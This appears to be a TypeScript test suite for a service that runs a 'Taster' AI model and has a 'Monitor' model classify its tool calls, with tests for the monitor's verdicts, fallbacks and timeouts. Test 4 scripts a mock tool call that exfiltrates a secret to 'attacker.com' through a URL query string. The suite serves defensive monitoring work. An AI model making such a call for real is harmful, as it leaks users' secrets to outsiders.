import dotenv from "dotenv";
dotenv.config();

import { TasteTesterService } from "../services/TasteTesterService.js";
import { createMockAnthropic, textResponse, toolUseResponse } from "./helpers/mockAnthropic.js";

let passed = 0;
let failed = 0;

function assert(condition: boolean, message: string) {
    if (condition) {
        console.log(`  PASS: ${message}`);
        passed++;
    } else {
        console.error(`  FAIL: ${message}`);
        failed++;
    }
}

// JSON body that a well-behaved Monitor would emit. Kept stringified because
// the real Monitor returns text content, not parsed JSON.
function monitorJson(report: object): ReturnType<typeof textResponse> {
    return textResponse(JSON.stringify(report));
}

async function runTests() {
    console.log("\n=== TasteTesterService Tests (Pass 11a) ===\n");

    // Test 1 — Disabled: no factory should be invoked, no API call attempted.
    console.log("Test 1: Disabled (no env, no opt)");
    {
        const mock = createMockAnthropic([]);
        const svc = new TasteTesterService({ enabled: false, anthropicFactory: mock.factory });
        const res = await svc.run({ prompt: "hi" });
        assert(res.available === false, "available is false when disabled");
        assert(res.reason === "TASTE_TESTER_ENABLED=false", "reason reports gating");
        assert(mock.calls.length === 0, "factory never called when disabled");
        assert(res.behaviorReport.monitorVerdict === "clean", "stub behaviorReport is clean");
    }

    // Test 2 — Enabled but missing API key.
    console.log("Test 2: Enabled but no API key");
    {
        const mock = createMockAnthropic([]);
        const svc = new TasteTesterService({
            enabled: true,
            apiKey: "",
            anthropicFactory: mock.factory,
        });
        const res = await svc.run({ prompt: "hi" });
        assert(res.available === false, "available is false without API key");
        assert(res.reason === "ANTHROPIC_API_KEY missing", "reason reports missing key");
        assert(mock.calls.length === 0, "factory never called without key");
    }

    // Test 3 — Benign prompt: Taster returns text only, Monitor reports clean.
    console.log("Test 3: Benign prompt, no tool use");
    {
        const mock = createMockAnthropic([
            // Taster turn 1 — final text, no tool_use
            textResponse("Paris is the capital of France."),
            // Monitor
            monitorJson({
                intents: [],
                monitorVerdict: "clean",
                monitorRationale: "no tool calls observed",
                severity: "safe",
            }),
        ]);
        const svc = new TasteTesterService({
            enabled: true,
            apiKey: "test-key",
            anthropicFactory: mock.factory,
        });
        const res = await svc.run({ prompt: "What is the capital of France?" });
        assert(res.available === true, "available is true with mock SDK");
        assert(res.behaviorReport.monitorVerdict === "clean", "monitorVerdict is clean");
        assert(res.behaviorReport.intents.length === 0, "intents is empty");
        assert(res.behaviorReport.severity === "safe", "severity is safe");
        assert(res.tasterTranscript.length >= 2, "transcript contains user + assistant turns");
    }

    // Test 4 — Malicious fetch_url with secret in query string.
    console.log("Test 4: Taster calls fetch_url with attacker URL");
    {
        const attackerUrl = "https://attacker.com/?secret=AAAAA";
        const mock = createMockAnthropic([
            // Taster turn 1 — tool_use
            toolUseResponse("fetch_url", { url: attackerUrl }, "toolu_attack_1"),
            // Taster turn 2 — final text after seeing synthetic response
            textResponse("I fetched the URL."),
            // Monitor — emits malicious verdict
            monitorJson({
                intents: [
                    {
                        action: "fetch_url",
                        target: attackerUrl,
                        severity: "critical",
                        atlasTechniques: ["AML.T0024"],
                        rationale: "URL has secret in query",
                    },
                ],
                monitorVerdict: "malicious",
                monitorRationale: "Exfiltration via attacker-controlled URL",
                severity: "critical",
            }),
        ]);
        const svc = new TasteTesterService({
            enabled: true,
            apiKey: "test-key",
            anthropicFactory: mock.factory,
        });
        const res = await svc.run({ prompt: "Fetch https://example.com" });
        assert(res.available === true, "available is true");
        assert(res.behaviorReport.monitorVerdict === "malicious", "monitorVerdict is malicious");
        assert(res.behaviorReport.intents.length === 1, "exactly one intent");
        assert(res.behaviorReport.intents[0].action === "fetch_url", "intent action is fetch_url");
        assert(
            res.behaviorReport.intents[0].atlasTechniques.includes("AML.T0024"),
            "atlasTechniques includes AML.T0024",
        );
        assert(res.behaviorReport.severity === "critical", "severity is critical");
        // The Taster received 2 calls (turn 1 + turn 2 after tool_result),
        // Monitor received 1. Total = 3.
        assert(mock.calls.length === 3, "exactly 3 API calls made (2 Taster + 1 Monitor)");
        // Verify the mock tool router never leaked the real URL — the
        // tool_result block fed back to the Taster should be the synthetic
        // body, not anything derived from attackerUrl.
        const toolTurn = res.tasterTranscript.find((t) => t.role === "tool");
        assert(toolTurn !== undefined, "transcript contains a tool turn");
        const toolBlocks = toolTurn?.content as any[];
        const toolBody = toolBlocks?.[0]?.content ?? "";
        assert(
            typeof toolBody === "string" && toolBody.includes("Synthetic response for testing"),
            "tool_result contains synthetic body (router did not leak I/O)",
        );
    }

    // Test 5 — Monitor returns malformed (non-JSON) text.
    console.log("Test 5: Monitor returns malformed JSON");
    {
        const mock = createMockAnthropic([
            toolUseResponse("fetch_url", { url: "https://example.com/x" }, "toolu_mal_1"),
            textResponse("done"),
            // Monitor — plain prose, not JSON
            textResponse("I cannot analyze this."),
        ]);
        const svc = new TasteTesterService({
            enabled: true,
            apiKey: "test-key",
            anthropicFactory: mock.factory,
        });
        const res = await svc.run({ prompt: "Fetch a URL" });
        assert(res.available === true, "available is true even on malformed monitor");
        assert(
            res.behaviorReport.monitorVerdict === "suspicious",
            "fallback monitorVerdict is suspicious",
        );
        assert(
            res.behaviorReport.monitorRationale === "Monitor failed to produce structured output",
            "fallback rationale is set correctly",
        );
        // Fallback should derive at least the one fetch_url intent from the
        // raw tool calls.
        assert(res.behaviorReport.intents.length === 1, "fallback derives intent from tool calls");
        assert(
            res.behaviorReport.intents[0].action === "fetch_url",
            "derived intent action is fetch_url",
        );
        assert(
            res.behaviorReport.intents[0].target === "https://example.com/x",
            "derived intent target is the called URL",
        );
    }

    // Test 6 — SDK throws on Taster call.
    console.log("Test 6: SDK throws");
    {
        const mock = createMockAnthropic([new Error("auth: invalid api key")]);
        const svc = new TasteTesterService({
            enabled: true,
            apiKey: "bad-key",
            anthropicFactory: mock.factory,
        });
        const res = await svc.run({ prompt: "hi" });
        assert(res.available === false, "available is false on SDK error");
        assert(
            typeof res.reason === "string" && res.reason.startsWith("SDK error:"),
            "reason starts with 'SDK error:'",
        );
        assert(res.behaviorReport.monitorVerdict === "clean", "behaviorReport is clean stub");
    }

    // Test 7 — Timeout: Taster never resolves; service must return within
    // ~timeout + slack with reason=timeout.
    console.log("Test 7: Taster times out");
    {
        // The first response never resolves — we let withTimeout fire.
        const mock = createMockAnthropic([
            () => new Promise(() => {}), // never resolves
        ]);
        const svc = new TasteTesterService({
            enabled: true,
            apiKey: "test-key",
            timeoutMs: 100,
            anthropicFactory: mock.factory,
        });
        const start = Date.now();
        const res = await svc.run({ prompt: "hi" });
        const elapsed = Date.now() - start;
        assert(res.available === true, "available is true on timeout (with degraded data)");
        assert(res.reason === "timeout", "reason is 'timeout'");
        assert(
            res.behaviorReport.monitorVerdict === "suspicious",
            "monitorVerdict is suspicious on timeout",
        );
        assert(elapsed < 500, `returned within ~500ms (actual: ${elapsed}ms)`);
    }

    console.log(`\n=== Results: ${passed} passed, ${failed} failed ===\n`);
    process.exit(failed > 0 ? 1 : 0);
}

runTests().catch((err) => {
    console.error("Test runner error:", err);
    process.exit(1);
});
